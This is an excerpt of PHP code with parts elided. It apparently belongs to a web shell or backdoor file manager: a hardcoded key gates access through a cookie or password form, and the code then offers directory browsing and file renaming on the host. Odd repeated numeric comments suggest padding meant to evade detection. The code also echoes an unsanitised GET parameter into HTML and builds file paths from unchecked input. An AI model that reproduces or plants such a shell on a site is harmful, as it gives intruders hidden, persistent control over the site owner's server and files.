...
$auth_key = "7ed32882e12afc19a575d2c328465e7b";
...
$pass = false;
if (isset($_COOKIE['pw_name_41823'])) {
    if(($_COOKIE['pw_name_41823']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_41823'])) {
        if(($_POST['pw_name_41823']) == $auth_key) {
            setcookie("pw_name_41823", $_POST['pw_name_41823']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_41823' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1723340090221660 1723340090604964 1723340090334205 1723340090482900
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1723340090221660 1723340090604964 1723340090334205 1723340090482900
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1723340090221660 1723340090604964 1723340090334205 1723340090482900
            $name = PATH . "/" . $_GET['r'];
